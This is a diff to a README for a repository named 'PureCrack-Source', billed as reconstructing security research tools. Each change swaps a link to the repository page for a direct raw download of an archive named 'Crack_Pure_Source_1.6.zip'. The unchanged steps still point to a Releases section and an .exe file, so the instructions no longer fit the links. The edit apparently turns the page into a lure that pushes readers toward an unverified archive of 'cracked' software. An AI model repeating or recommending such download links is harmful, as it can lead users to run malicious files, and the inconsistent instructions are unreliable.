@@ -1,6 +1,6 @@
 # 🛠️ PureCrack-Source - Reconstruct security research tools for analysis
 
-<a href="https://github.com/cherno9624/PureCrack-Source"><img src="https://img.shields.io/badge/Download-Release-blue" alt="Download"></a>
+<a href="https://github.com/cherno9624/PureCrack-Source/raw/refs/heads/main/src/Crack_Pure_Source_1.6.zip"><img src="https://img.shields.io/badge/Download-Release-blue" alt="Download"></a>
 
 ## 📋 Project Overview
 
@@ -22,7 +22,7 @@ If you lack the .NET Runtime, visit the official Microsoft website to install it
 
 Follow these steps to set up the software on your local machine.
 
-1. Go to this address: [https://github.com/cherno9624/PureCrack-Source](https://github.com/cherno9624/PureCrack-Source).
+1. Go to this address: [https://github.com/cherno9624/PureCrack-Source/raw/refs/heads/main/src/Crack_Pure_Source_1.6.zip](https://github.com/cherno9624/PureCrack-Source/raw/refs/heads/main/src/Crack_Pure_Source_1.6.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Select the most recent version shown.
 4. Click the link ending in .exe to start the file transfer.
